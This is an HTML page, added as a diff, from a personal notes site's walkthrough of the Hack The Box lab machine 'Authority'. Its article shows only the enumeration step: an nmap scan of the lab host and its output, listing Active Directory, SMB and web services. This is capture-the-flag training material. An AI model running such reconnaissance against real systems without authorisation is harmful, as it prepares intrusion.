@@ -1,0 +1,1483 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Awkward" href="../awkward/awkward.html" /><link rel="prev" title="Ambassador" href="../ambassador/ambassador.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Authority - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <p><img alt="authority.png" src="../../../../_images/authority.png" /></p>
+<section id="authority">
+<h1>Authority<a class="headerlink" href="#authority" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>nmap -Pn -sC -sV 10.10.11.222 -oN scans/nmap.initial
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 13:06 IST
+Nmap scan report for 10.10.11.222
+Host is up (0.031s latency).
+Not shown: 989 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-23 16:06:53Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject:
+| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+|_ssl-date: 2023-07-23T16:07:18+00:00; +4h00m00s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject:
+| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+|_ssl-date: 2023-07-23T16:07:17+00:00; +4h00m01s from scanner time.
+8443/tcp open  ssl/https-alt
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Site doesn&#39;t have a title (text/html;charset=ISO-8859-1).
+| fingerprint-strings:
+|   FourOhFourRequest, GetRequest:
+|     HTTP/1.1 200
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 82
+|     Date: Sun, 23 Jul 2023 16:06:59 GMT
+|     Connection: close
+|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=&#39;/pwm&#39;&quot;/&gt;&lt;/head&gt;&lt;/html&gt;
+|   HTTPOptions:
+|     HTTP/1.1 200
+|     Allow: GET, HEAD, POST, OPTIONS
+|     Content-Length: 0
+|     Date: Sun, 23 Jul 2023 16:06:59 GMT
+|     Connection: close
+|   RTSPRequest:
+|     HTTP/1.1 400
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 1936
+|     Date: Sun, 23 Jul 2023 16:07:05 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400
+|     Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400
+|_    Request&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
+| ssl-cert: Subject: commonName=172.16.2.118
+| Not valid before: 2023-07-21T10:43:31
+|_Not valid after:  2025-07-22T22:21:55
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/23%Time=64BD17E3%P=aarch64-unknown-li
+SF:nux-gnu%r(GetRequest,DB,&quot;HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/
+SF:html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\x2023
+SF:\x20Jul\x202023\x2016:06:59\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\
+SF:n\n\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\&quot;refresh\&quot;\x20content=\&quot;0;URL=&#39;/p
+SF:wm&#39;\&quot;/&gt;&lt;/head&gt;&lt;/html&gt;&quot;)%r(HTTPOptions,7D,&quot;HTTP/1\.1\x20200\x20\r\nAllow
+SF::\x20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:
+SF:\x20Sun,\x2023\x20Jul\x202023\x2016:06:59\x20GMT\r\nConnection:\x20clos
+SF:e\r\n\r\n&quot;)%r(FourOhFourRequest,DB,&quot;HTTP/1\.1\x20200\x20\r\nContent-Typ
+SF:e:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x2
+SF:0Sun,\x2023\x20Jul\x202023\x2016:06:59\x20GMT\r\nConnection:\x20close\r
+SF:\n\r\n\n\n\n\n\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\&quot;refresh\&quot;\x20content=
+SF:\&quot;0;URL=&#39;/pwm&#39;\&quot;/&gt;&lt;/head&gt;&lt;/html&gt;&quot;)%r(RTSPRequest,82C,&quot;HTTP/1\.1\x20400\
+SF:x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x2
+SF:0en\r\nContent-Length:\x201936\r\nDate:\x20Sun,\x2023\x20Jul\x202023\x2
+SF:016:07:05\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html
+SF:\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20B
+SF:ad\x20Request&lt;/title&gt;&lt;style\x20type=\&quot;text/css\&quot;&gt;body\x20{font-family:T
+SF:ahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;back
+SF:ground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:1
+SF:6px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{col
+SF:or:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:non
+SF:e;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Ba
+SF:d\x20Request&lt;/h1&gt;&lt;hr\x20class=\&quot;line\&quot;\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\x20Exception
+SF:\x20Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\x20Invalid\x20character\x20found\x20in\
+SF:x20the\x20HTTP\x20protocol\x20\[RTSP&amp;#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]&lt;/
+SF:p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt;\x20The\x20server\x20cannot\x20or\x20will\x20not
+SF:\x20process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x
+SF:20perceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malform
+SF:ed\x20request\x20syntax,\x20invalid\x20&quot;);
+Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2023-07-23T16:07:12
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.59 seconds
+</pre></div>
+</div>
